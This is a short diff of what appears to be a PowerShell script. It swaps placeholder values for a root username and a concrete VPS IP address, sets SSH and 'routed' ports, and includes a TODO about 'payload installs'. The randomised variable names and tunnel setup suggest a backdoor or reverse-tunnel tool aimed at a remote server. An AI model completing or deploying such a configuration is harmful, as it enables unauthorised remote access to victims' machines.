@@ -1,7 +1,7 @@
 # TODO: incorporate necessary payload installs
 
-$nkowFESgaO = "USERNAME" # change me, vps username
-$ecPlmJVLRo = "X.X.X.X" # change me, vps ip address
+$nkowFESgaO = "root" # change me, vps username
+$ecPlmJVLRo = "195.35.32.34" # change me, vps ip address
 $ENyMAhIrsb = "22" # change me, default vps port [default 22]
 $YlEQgBmePn = "2583" # change me, routed vps port [NOT TO DEFAULT SSH PORT]
 
